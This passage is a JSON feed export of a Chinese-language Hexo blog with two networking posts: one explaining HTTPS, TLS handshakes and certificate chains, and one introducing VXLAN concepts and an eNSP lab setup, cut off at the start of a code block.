{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/02/21/https%E5%8E%9F%E7%90%86/",
            "url": "http://example.com/2023/02/21/https%E5%8E%9F%E7%90%86/",
            "title": "https+TLS",
            "date_published": "2023-02-21T05:38:45.000Z",
            "content_html": "<h1 id=\"https原理\"><a class=\"markdownIt-Anchor\" href=\"#https原理\">#</a> https 原理</h1>\n<h2 id=\"0x00前置知识\"><a class=\"markdownIt-Anchor\" href=\"#0x00前置知识\">#</a> 0x00 前置知识</h2>\n<h3 id=\"1对称加密\"><a class=\"markdownIt-Anchor\" href=\"#1对称加密\">#</a> 1. 对称加密</h3>\n<p>加锁和解锁用的是同一把钥匙</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/851282a6599be640caa822804e192ec2.gif\" alt=\"img\"></p>\n<p>由于中间人没有钥匙，无法偷窥和篡改</p>\n<p>但密钥在传输的过程中可能泄露，并没有完全解决问题</p>\n<h3 id=\"2非对称加密\"><a class=\"markdownIt-Anchor\" href=\"#2非对称加密\">#</a> 2. 非对称加密</h3>\n<p>** 用钥匙 A 加锁，必须用钥匙 B 才能解锁。反过来用钥匙 B 加锁，必须用钥匙 A 才能解锁。** 自己保留其中一把，将另一把给对方</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/0c649c404026647ebcd999a30dafeb75.gif\" alt=\"img\"></p>\n<p>中间人不能篡改消息，因为没有加密密钥，如果篡改接收方不再能使用原来的密钥解锁</p>\n<p>但无法解决内容被偷窥即内容泄露，因为解锁的密钥大家都有</p>\n<h3 id=\"3对称加密非对称加密\"><a class=\"markdownIt-Anchor\" href=\"#3对称加密非对称加密\">#</a> 3. 对称加密 + 非对称加密</h3>\n<p>对方生成两把密钥，将其中一把传给我，我在生成一个钥匙，用对方给的密钥加密，在传给对方。<strong>即用非对称加密加密对称加密的密钥</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/66b748fff608b82656585af31cc9b6ae.png\" alt=\"img\"></p>\n<p>解决了信息泄露和篡改问题，因为 D 加密的密钥只有 C 能解开，因为对称密钥可以安全传递，由于中间人无法解密对称密钥，后续传输的消息也无法解密</p>\n<p>但我们不能验证传来的 D 密钥一定就是对方给我的，即客户端如何识别服务端的合法性的问题没有解决</p>\n<p>如果中间人自己生成了一堆密钥，在对方给我 D 时截获，把自己的密钥 Y 给我，我并不知情，用 Y 加锁了 M，中间人就能在通过自己生成的 x 解密，得到对称加密的密钥，从而后续消息全部被泄露</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230223094902707.png\" alt=\"image-20230223094902707\"></p>\n<h3 id=\"4ca\"><a class=\"markdownIt-Anchor\" href=\"#4ca\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovLzQuQ0E=\">4.CA</span></h3>\n<p>引入可信的第三机构，即此处条件时第三方绝对可信，要是你不相信那我就不和你玩啦</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230223094951762.png\" alt=\"image-20230223094951762\"></p>\n<p>第三方机构生成两把密钥，将公钥公开。下次传输时我们先找第三方让他用私钥给我们的公钥加密，加密后在传给对方，由于第三方的公钥大家都有，我就能使用第三方的公钥解密发来的公钥，即由于没有第三方的私钥，中间人不能篡改密钥，因为他们没有第三方的私钥，无法加锁，那么后续我就能用非对称加密的密钥加锁对称加密的密钥，实现 0x03 最开始的步骤</p>\n<h3 id=\"5总结一下\"><a class=\"markdownIt-Anchor\" href=\"#5总结一下\">#</a> 5. 总结一下</h3>\n<p>1. 这个过程中，小宇就是服务端，我就是客户端，班长就是 CA</p>\n<p>2. 对于服务端来说，他使用的是公钥加密，私钥解密，这个叫做加密。对于 CA 来说私钥加密，公钥解密，这个叫做签名</p>\n<p>3. 对称加密，对称加密的速度很快，可以用于传输过程中的数据加密，防止中间人查看和篡改信息。但是如何将对称加密的秘钥安全传递过去，是个问题。</p>\n<p>4. 双钥匙就是非对称加密，非对称加密的速度慢，可以用于加密少量数据，同时也可以用于签名防止篡改</p>\n<ol start=\"5\">\n<li></li>\n</ol>\n<h2 id=\"tls\"><a class=\"markdownIt-Anchor\" href=\"#tls\">#</a> TLS</h2>\n<p>HTTP 由于是明文传输，所谓的明文，就是说客户端与服务端通信的信息都是肉眼可见的，随意使用一个抓包工具都可以截获通信的内容。</p>\n<p>HTTP<strong>S</strong> 在 HTTP 与 TCP 层之间加入了 TLS 协议，来解决窃听，篡改，冒充的风险。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230223093249740.png\" alt=\"image-20230223093249740\"></p>\n<p>TLS 协议是如何解决 HTTP 的风险的呢？</p>\n<ul>\n<li><em>信息加密</em>：HTTP 交互信息是被加密的，第三方就无法被窃取；</li>\n<li><em>校验机制</em>：校验信息传输过程中是否有被第三方篡改过，如果被篡改过，则会有警告提示；</li>\n<li><em>身份证书</em>：证明淘宝是真的淘宝网；</li>\n</ul>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/dkBwYObE91VMUpC.png\" alt=\"image-20210126102630933\"></p>\n<p>HTTPS 是应用层协议，需要先完成 TCP 连接建立，然后走 TLS 握手过程后，才能建立通信安全的连接。</p>\n<h2 id=\"rsa密钥协商握手过程\"><a class=\"markdownIt-Anchor\" href=\"#rsa密钥协商握手过程\">#</a> RSA 密钥协商握手过程</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/mQadqwHV3EMJogv.png\" alt=\"图片\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/VTmwlMEOsI1rnPg.png\" alt=\"图片\"></p>\n<h3 id=\"tls第一次握手\"><a class=\"markdownIt-Anchor\" href=\"#tls第一次握手\">#</a> TLS 第一次握手</h3>\n<p>客户端首先会发一个「<strong>Client Hello</strong>」消息</p>\n<p>消息里面有客户端使用的 TLS 版本号、支持的密码套件列表，支持的压缩算法，以及生成的<strong>随机数（*Client Random*）</strong>，这个随机数会被服务端保留，它是生成对称加密密钥的材料之一。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/ka4Yr6OQmNPpDhL.png\" alt=\"图片\"></p>\n<h3 id=\"tls第二次握手\"><a class=\"markdownIt-Anchor\" href=\"#tls第二次握手\">#</a> TLS 第二次握手</h3>\n<p>当服务端收到客户端的「Client Hello」消息后，会确认 TLS 版本号是否支持，和从密码套件列表中选择一个密码套件，还有选择压缩算法（安全性原因，一般不压缩），以及生成<strong>随机数（*Server Random*）</strong>。</p>\n<p>接着，返回「<strong>Server Hello</strong>」消息，消息里面有服务器确认的 TLS 版本号，也给出了随机数（Server Random），然后从客户端的密码套件列表选择了一个合适的密码套件。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/TtrAV1xlXLRuH5M.png\" alt=\"图片\"></p>\n<p>密码套件的基本形式是：密钥交换算法 + 签名算法 + 对称加密算法 + 摘要算法</p>\n<p>其实这两个随机数是后续作为生成「会话密钥」的条件，所谓的会话密钥就是数据传输时，所使用的对称加密密钥。</p>\n<p>服务端为了证明自己的身份，会发送「<strong>Server Certificate</strong>」给客户端，这个消息里含有数字证书。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/48MXspeJuiRlfqT.png\" alt=\"图片\"></p>\n<p>随后，服务端发了「<strong>Server Hello Done</strong>」消息</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/h8t2PL745AFS1uo.png\" alt=\"image-20210831144857433\"></p>\n<h3 id=\"tls第三次握手\"><a class=\"markdownIt-Anchor\" href=\"#tls第三次握手\">#</a> TLS 第三次握手</h3>\n<p>客户端验证完证书后，认为可信则继续往下走。接着，客户端就会生成一个新的<strong>随机数 (pre-master)</strong>，用服务器的 RSA 公钥加密该随机数，通过「<strong>Change Cipher Key Exchange</strong>」消息传给服务端。</p>\n<p>服务端收到后，用 RSA 私钥解密，得到客户端发来的随机数 (pre-master)。</p>\n<p>至此，<strong>客户端和服务端双方都共享了三个随机数，分别是 Client Random、Server Random、pre-master</strong>。</p>\n<p>于是，双方根据已经得到的三个随机数，生成<strong>会话密钥（Master Secret）</strong>，它是对称密钥，用于对后续的 HTTP 请求 / 响应的数据加解密。</p>\n<p>生成完会话密钥后，然后客户端发一个「<strong>Change Cipher Spec</strong>」，告诉服务端开始使用加密方式发送消息。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/LiAoKdyMlIOrJjQ.png\" alt=\"图片\"></p>\n<p>然后，客户端再发一个「<strong>Encrypted Handshake Message（Finishd）</strong>」消息，把之前所有发送的数据做个摘要，再用会话密钥（master secret）加密一下，让服务器做个验证，验证加密通信是否可用和之前握手信息是否有被中途篡改过。</p>\n<p>Change Cipher Spec」之前传输的 TLS 握手数据都是明文，之后都是对称密钥加密的密文。</p>\n<h3 id=\"tls-第四次握手\"><a class=\"markdownIt-Anchor\" href=\"#tls-第四次握手\">#</a> TLS 第四次握手</h3>\n<p>服务器也是同样的操作，发「<strong>Change Cipher Spec</strong>」和「<strong>Encrypted Handshake Message</strong>」消息，如果双方都验证加密和解密没问题，那么握手正式完成。</p>\n<p>最后，就用「会话密钥」加解密 HTTP 请求和响应了。</p>\n<h3 id=\"第二阶段客户端核验证书\"><a class=\"markdownIt-Anchor\" href=\"#第二阶段客户端核验证书\">#</a> 第二阶段客户端核验证书</h3>\n<p>一个数字证书通常包含了：</p>\n<ul>\n<li>公钥；</li>\n<li>持有者信息；</li>\n<li>证书认证机构（CA）的信息；</li>\n<li>CA 对这份文件的数字签名及使用的算法；</li>\n<li>证书有效期；</li>\n<li>还有一些其他额外信息；</li>\n</ul>\n<p>服务端的证书都是由 CA （<em>Certificate Authority</em>，证书认证机构）签名的，具有极高的可信度，所以由它来给各个公钥签名，信任的一方签发的证书，那必然证书也是被信任的。</p>\n<p>数字证书签发和验证流程</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/dVPZvSjxRzCwWU1.png\" alt=\"图片\"></p>\n<blockquote>\n<p>CA 签发证书的过程，如上图左边部分：</p>\n<ul>\n<li>首先 CA 会把持有者的公钥、用途、颁发者、有效时间等信息打成一个包，然后对这些信息进行 Hash 计算，得到一个 Hash 值；</li>\n<li>然后 CA 会使用自己的私钥将该 Hash 值加密，生成 Certificate Signature，也就是 CA 对证书做了签名；</li>\n<li>最后将 Certificate Signature 添加在文件证书上，形成数字证书；</li>\n</ul>\n<p>客户端校验服务端的数字证书的过程，如上图右边部分：</p>\n<ul>\n<li>首先客户端会使用同样的 Hash 算法获取该证书的 Hash 值 H1；</li>\n<li>通常浏览器和操作系统中集成了 CA 的公钥信息，浏览器收到证书后可以使用 CA 的公钥解密 Certificate Signature 内容，得到一个 Hash 值 H2 ；</li>\n<li>最后比较 H1 和 H2，如果值相同，则为可信赖的证书，否则则认为证书不可信。</li>\n</ul>\n</blockquote>\n<h3 id=\"证书链\"><a class=\"markdownIt-Anchor\" href=\"#证书链\">#</a> 证书链</h3>\n<p>我们向 CA 申请的证书一般不是根证书签发的，而是由中间证书签发的，比如百度的证书，从下图你可以看到，证书的层级有三级：</p>\n<p>对于这种三级层级关系的证书的验证过程如下：</p>\n<ul>\n<li>客户端收到 <span class=\"exturl\" data-url=\"aHR0cDovL2JhaWR1LmNvbQ==\">baidu.com</span> 的证书后，发现这个证书的签发者不是根证书，就无法根据本地已有的根证书中的公钥去验证 <span class=\"exturl\" data-url=\"aHR0cDovL2JhaWR1LmNvbQ==\">baidu.com</span> 证书是否可信。于是，客户端根据 <span class=\"exturl\" data-url=\"aHR0cDovL2JhaWR1LmNvbQ==\">baidu.com</span> 证书中的签发者，找到该证书的颁发机构是 “GlobalSign Organization Validation CA - SHA256 - G2”，然后向 CA 请求该中间证书。</li>\n<li>请求到证书后发现 “GlobalSign Organization Validation CA - SHA256 - G2” 证书是由 “GlobalSign Root CA” 签发的，由于 “GlobalSign Root CA” 没有再上级签发机构，说明它是根证书，也就是自签证书。应用软件会检查此证书有否已预载于根证书清单上，如果有，则可以利用根证书中的公钥去验证 “GlobalSign Organization Validation CA - SHA256 - G2” 证书，如果发现验证通过，就认为该中间证书是可信的。</li>\n<li>“GlobalSign Organization Validation CA - SHA256 - G2” 证书被信任后，可以使用 “GlobalSign Organization Validation CA - SHA256 - G2” 证书中的公钥去验证 <span class=\"exturl\" data-url=\"aHR0cDovL2JhaWR1LmNvbQ==\">baidu.com</span> 证书的可信性，如果验证通过，就可以信任 <span class=\"exturl\" data-url=\"aHR0cDovL2JhaWR1LmNvbQ==\">baidu.com</span> 证书。</li>\n</ul>\n<p>最开始客户端只信任根证书 GlobalSign Root CA 证书的，然后 “GlobalSign Root CA” 证书信任 “GlobalSign Organization Validation CA - SHA256 - G2” 证书，而 “GlobalSign Organization Validation CA - SHA256 - G2” 证书又信任 <span class=\"exturl\" data-url=\"aHR0cDovL2JhaWR1LmNvbQ==\">baidu.com</span> 证书，于是客户端也信任 <span class=\"exturl\" data-url=\"aHR0cDovL2JhaWR1LmNvbQ==\">baidu.com</span> 证书。</p>\n<p>为了确保根证书的绝对安全性，将根证书隔离地越严格越好，不然根证书如果失守了，那么整个信任链都会有问题。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/Szq7jLfxumFhOWc.png\" alt=\"图片\"></p>\n<h2 id=\"rsa缺陷\"><a class=\"markdownIt-Anchor\" href=\"#rsa缺陷\">#</a> RSA 缺陷</h2>\n<p><strong>使用 RSA 密钥协商算法的最大问题是不支持前向保密</strong>。因为客户端传递随机数（用于生成对称加密密钥的条件之一）给服务端时使用的是公钥加密的，服务端收到后，会用私钥解密得到随机数。所以一旦服务端的私钥泄漏了，过去被第三方截获的所有 TLS 通讯密文都会被破解。</p>\n<p>DH 解决了 RSA 的问题，<strong>即使第三方截获了 TLS 握手阶段传递的公钥，在不知道的私钥的情况下，也是无法计算出密钥的，而且每一次对称加密密钥都是实时生成的，实现前向保密</strong>。</p>\n<p>但因为 DH 算法的计算效率问题，后面出现了 ECDHE 密钥协商算法，我们现在大多数网站使用的正是 ECDHE 密钥协商算法。</p>\n<h3 id=\"再总结一下\"><a class=\"markdownIt-Anchor\" href=\"#再总结一下\">#</a> 再总结一下</h3>\n<p>假设下面客户端和服务端使用的是 RSA 密钥交换算法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.客户端和服务端进行tcp三次握手</span><br><span class=\"line\"></span><br><span class=\"line\">-----------第一次握手---------------</span><br><span class=\"line\"></span><br><span class=\"line\">2.客户端发送client hello，其中携带随机数C，TLS版本号，支持的密码套件列表</span><br><span class=\"line\"></span><br><span class=\"line\">-----------第一次握手结束-------------</span><br><span class=\"line\"></span><br><span class=\"line\">服务端发送ack</span><br><span class=\"line\"></span><br><span class=\"line\">-----------第二次握手---------------</span><br><span class=\"line\"></span><br><span class=\"line\">3.服务端生成随机数S，确认TLS版本号，使用的密码套件，放在server hello中回给客户端</span><br><span class=\"line\"></span><br><span class=\"line\">4.服务端发送server certificate，其中包含自己的数字证书</span><br><span class=\"line\"></span><br><span class=\"line\">5.服务端发送server hello done，本地hello完毕</span><br><span class=\"line\"></span><br><span class=\"line\">-----------第二次握手结束-------------</span><br><span class=\"line\"></span><br><span class=\"line\">-----------客户端验证证书---------------</span><br><span class=\"line\"></span><br><span class=\"line\">6.客户端使用第二次握手中协商的hash算法对证书进行hash计算得到一个hash值</span><br><span class=\"line\"></span><br><span class=\"line\">7.用CA公钥解密证书中的certificate signature.(证书中的certificate signature是证书通过相同的额hash算法在经过CA私钥加密得到的)</span><br><span class=\"line\"></span><br><span class=\"line\">8.如果6和7中两次hash计算得到的hash不一样，那么认为证书不可信，如果可信，进行第三次握手</span><br><span class=\"line\"></span><br><span class=\"line\">-----------客户端验证证书结束----------</span><br><span class=\"line\"></span><br><span class=\"line\">-----------第三次握手---------------</span><br><span class=\"line\"></span><br><span class=\"line\">9.客户端生成一个新的随机数(pre-master)，用服务端的RSA公钥加密，通过Change Cipher Key Exchange传给服务器</span><br><span class=\"line\"></span><br><span class=\"line\">10.服务端用RSA私钥解密，得到Pre-master</span><br><span class=\"line\"></span><br><span class=\"line\">11.双方根据 Client Random(C)、Server Random(S)、pre-master 生成对称加密的密钥</span><br><span class=\"line\"></span><br><span class=\"line\">之后发送的都是对称密钥加密的密文</span><br><span class=\"line\"></span><br><span class=\"line\">12.客户端发送Change Cipher Spec 告诉我服务端开始使用加密方式发送信息</span><br><span class=\"line\"></span><br><span class=\"line\">13.客户端发送Encrypted Handshake Message（Finishd）消息，把之前发送数据做hash，在使用11生成的密钥加密，发给服务器做验证，验证加密通信是否可用和之前握手信息是否有被中途篡改过</span><br><span class=\"line\"></span><br><span class=\"line\">-----------第三次握手结束-------------</span><br><span class=\"line\"></span><br><span class=\"line\">-----------第四次握手---------------</span><br><span class=\"line\"></span><br><span class=\"line\">14.服务端发送Change Cipher Spec 告诉我服务端开始使用加密方式发送信息</span><br><span class=\"line\"></span><br><span class=\"line\">15.服务端发送Encrypted Handshake Message（Finishd）消息，把之前发送数据做hash，在使用11生成的密钥加密，发给客户器做验证，验证加密通信是否可用和之前握手信息是否有被中途篡改过</span><br></pre></td></tr></table></figure>\n<h2 id=\"ssl和tls区别\"><a class=\"markdownIt-Anchor\" href=\"#ssl和tls区别\">#</a> SSL 和 TLS 区别</h2>\n<p>SSL</p>\n<p>Secure Socket Layer，安全套接字层。SSL 为应用程序提供加密数据通道，它采用了 RC4、MD5 以及 RSA 等加密算法，使用 40 位的密钥，适用于商业信息的加密。</p>\n<p>SSL 协议组成：SSL 记录协议 + SSL 握手协议</p>\n<p>记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如 TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。</p>\n<p>SSL 握手协议（SSL Handshake Protocol）：它建立在 SSL 记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p>\n<p>TLS</p>\n<p>Transport Layer Security，安全传输层协议。IETF 对 SSL3.0 进行了标准化，并添加了少数机制 (但是几乎和 SSL3.0 无差异)，标准化后的 IETF 更名为 TLS1.0</p>\n<p>TLS 协议组成：TLS 记录协议 + TLS 握手协议</p>\n<p>TLS 是独立于应用层协议，如何启动 TLS 握手协议以及如何解释交换的认证证书的决定权留给协议的设计者和实施者来判断。</p>\n<p>TLS 记录协议：是一种分层协议，支持信息传输、将数据分段到可处理块、压缩数据、应用 MAC 、加密以及传输结果等。对接收到的数据进行解密、校验、解压缩、重组等，然后将它们传送到高层客户机</p>\n<p>TLS 握手协议：由三个子协议组构成，允许对等双方在记录层的安全参数上达成一致、自我认证、例示协商安全参数、互相报告出错条件。</p>\n<p>TLS 和 SSL 区别</p>\n<blockquote>\n<p>TLS 的产生是为了让 SSL 更安全，使协议更加精确和完善。TLS 在 SSL3.0 基础上增强了其他内容。它们的最主要的差别是所支持的加密算法不同，TLS 和 SSL3.0 不能互相操作，TLS 相当于 SSL 3.1</p>\n<p>TLS 的记录格式与 SSL 一样，但版本号不同，TLS 的版本使用的是 SSL 3.1。TLS 就是以 3.0 为基础定义的。</p>\n<p><strong>报文鉴别码不一样</strong>。TLS 使用了 RFC-2104 定义的 HMAC 算法，SSL3.0 使用了类似的算法，虽然安全程度一样，但具体算法不一样，填充字节和秘钥之间采用的是连接运算，而 HMAC 采用的是异或运算。</p>\n<p><strong>伪随机数函数不一样</strong>。TLS 使用了 PRF 伪随机函数将秘钥扩展成数据块，PRF 使用两种散列算法保证其安全性，只有两种算法都暴露数据才会不安全。</p>\n<p><strong>TLS 有更严密的警报</strong>。除了 SSL 的报警代码，TLS 还补充了很多报警代码，如解密失败，记录溢出，拒绝访问等</p>\n<p><strong>密文和客户证书</strong>：TLS 不支持 Fortezza 秘钥交换、加密算法和客户证书。</p>\n<p>对于消息的认证采用秘钥散列法 (HMAC)：当消息在开放的网络上传输时，通过 HMAC 确保传输的信息不会被篡改。HMAC 比 SSL3.0 的消息认证法 MAC 更安全。</p>\n<p><strong>增强的伪随机公能</strong> (PRF)：HMAC 定义 PRF, 用于生成秘钥数据。PRF 使用两种散列算法保证其安全性，只有两种算法都暴露数据才会不安全。</p>\n</blockquote>\n<h2 id=\"tls-12和tls-13\"><a class=\"markdownIt-Anchor\" href=\"#tls-12和tls-13\">#</a> TLS 1.2 和 TLS 1.3</h2>\n<p>目前低版本的 TLS （例如：SSL 3.0/TLS 1.0 等）存在许多严重漏洞。</p>\n<p>TLS 1.3 与之前的协议有较大差异，主要在于：</p>\n<blockquote>\n<ul>\n<li>相比过去的的版本，引入了新的密钥协商机制 — PSK</li>\n<li>支持 0-RTT 数据传输，在建立连接时节省了往返时间</li>\n<li>废弃了 3DES、RC4、AES-CBC 等加密组件，废弃了 SHA1、MD5 等哈希算法</li>\n<li>ServerHello 之后的所有握手消息采取了加密操作，可见明文大大减少</li>\n<li>不再允许对加密报文进行压缩、不再允许双方发起重协商</li>\n<li>DSA 证书不再允许在 TLS 1.3 中使用</li>\n</ul>\n</blockquote>\n<p>TLS 1.2</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-4da93c38f9b07d63413a2d05dbb49d43_720w.webp\" alt=\"img\"></p>\n<p>TLS 1.3</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-92d195e62d01c0e085952c6e6c90a75d_720w.webp\" alt=\"img\"></p>\n<p>使用 TLS 1.2 需要两次往返（ 2-RTT ）才能完成握手</p>\n<p>TLS 1.3 的握手不再支持静态的 RSA 密钥交换，这意味着必须使用带有前向安全的 Diffie-Hellman 进行全面握手。使用 TLS 1.3 协议只需要一次往返（ 1-RTT ）就可以完成握手。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x1b19ib2tlL2FydGljbGUvZGV0YWlscy8xMTQyMjA0NTA=\">SSL 与 TLS 到底有何区别，一见分晓_luo_boke 的博客 - CSDN 博客_ssl 和 tls 区别</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NDk4MDM4MQ==\">TLS1.3 VS TLS1.2，让你明白 TLS1.3 的强大 - 知乎 (zhihu.com)</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/01/20/VXLAN/",
            "url": "http://example.com/2023/01/20/VXLAN/",
            "title": "VXLAN",
            "date_published": "2023-01-20T05:38:45.000Z",
            "content_html": "<h1 id=\"vxlan\"><a class=\"markdownIt-Anchor\" href=\"#vxlan\">#</a> VXLAN</h1>\n<h2 id=\"enspvirtualbox设置\"><a class=\"markdownIt-Anchor\" href=\"#enspvirtualbox设置\">#</a> ensp&amp;virtualbox 设置</h2>\n<p>1. 导入 CE 镜像</p>\n<p>拖一台 CE12800，启动设备，系统会让自动选择镜像，选择 CE 镜像，正确的镜像为 1.3G 的</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101221931649.png\" alt=\"image-20230101221931649\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101222035060.png\" alt=\"image-20230101222035060\"></p>\n<p>导入后 virtualbox 中会显示</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101221847981.png\" alt=\"image-20230101221847981\"></p>\n<p>更改 CE 设置，设置内存，每台 CE12800 大概需要 1G 内存</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101222420086.png\" alt=\"image-20230101222420086\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101222459733.png\" alt=\"image-20230101222459733\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101222528294.png\" alt=\"image-20230101222528294\"></p>\n<h2 id=\"vxlan-2\"><a class=\"markdownIt-Anchor\" href=\"#vxlan-2\">#</a> VXLAN</h2>\n<p>VXLAN 是由 IETF 定义的 NVO3 (Network Virtualization over Layer 3) 标准技术之一，采用 L2 over L4 ( MAC-in-UDP) 的报文封装模式，将二层报文用三层协议进行封装，可实现二层网络在三层范围内进行扩展，同时满足数据中心大二层虚拟迁移和多租户的需求。</p>\n<p>Vxlan 是一种无控制平面，利用底层 IP 网络实现二层通信的隧道技术。</p>\n<p>GRE 也是无控制平面，不需要使用协议维护隧道状态。比如 LDP 是 LSP 的控制平面。</p>\n<p>底层的 IP 网络称为 Underlay 网络，Vxlan 则称为 Overlayer 网络。</p>\n<h2 id=\"名词解释\"><a class=\"markdownIt-Anchor\" href=\"#名词解释\">#</a> 名词解释</h2>\n<h3 id=\"nvo3-nve\"><a class=\"markdownIt-Anchor\" href=\"#nvo3-nve\">#</a> NVO3 &amp; NVE</h3>\n<p>NVO3 (Network Virtualization Over Layer 3), 基于三层 IP overlay 网络构建虚拟网络技术统称为 NVO3。运行 NVO3 的设备叫做 NVE (NetworkVirtualization Edge) ，它位于 overlay 网络的边界，实现二、三层的虚拟化功能。<strong>NVE 是执行 VXLAN 封装和接封装的设备</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101223857131.png\" alt=\"image-20230101223857131\"></p>\n<h3 id=\"vtep\"><a class=\"markdownIt-Anchor\" href=\"#vtep\">#</a> VTEP</h3>\n<p><strong>VXLAN 网络中的 NVE 以 VTEP 进行标识</strong>，VTEP (VXLAN Tunnel Endpoint，VXLAN 隧道端点)<br>\n 每一个 NVE 至少有一个 VTEP，VTEP 使用 NVE 的 IP 地址表示<br>\n两个 VTEP 可以确定一条 VXLAN 隧道，VTEP 间的这条 VXLAN 隧道将被两个 NVE 间的所有 VNI 所公用</p>\n<p>VTEP 即标识设备，也标识 VXLAN 隧道，两个 VTEP 地址之间唯一的确定一条 VXLAN 隧道。所以 VTEP 的地址要求全网可达</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101223916250.png\" alt=\"image-20230101223916250\" style=\"zoom: 80%;\" /> \n<h3 id=\"vni\"><a class=\"markdownIt-Anchor\" href=\"#vni\">#</a> VNI</h3>\n<p>VNI - VXLAN 网络标识符</p>\n<p><strong>VNI 是一种类似于 VLANID 的用户标示，一个 VNl 代表了一个租户</strong>，属于不同 VNI 的虚拟机之间不能直接进行二层通信。VXLAN 报文封装时，给 VNI 分配了足够的空间使其可以支持海量租户的隔离。</p>\n<p>应用场景</p>\n<p>虚拟机在同一网段需要互访的情景，在没有 VXLAN 是，只能在同一个物理机上。使用 VXLAN，可以去除网络限制，使资源分配</p>\n<p>2 层 VPN：封装的对象是帧，VXLAN，TRILL，L2TP，PPTP，VPLS</p>\n<p>3 层 VPN：封装的对象是包，IPSEC，GRE，DSVPN，MPLS VPN</p>\n<p>ipsec vpn 隧道模式，3 层 vpn</p>\n<p>ipsec vpn 传输模式，只封装 IP 之上的内容</p>\n<p>应用层 VPN：SSL VPN</p>\n<p>MPLS VPN：三层</p>\n<p>VPLS：二层</p>\n<h2 id=\"实验1同子网互访\"><a class=\"markdownIt-Anchor\" href=\"#实验1同子网互访\">#</a> 实验 1: 同子网互访</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span 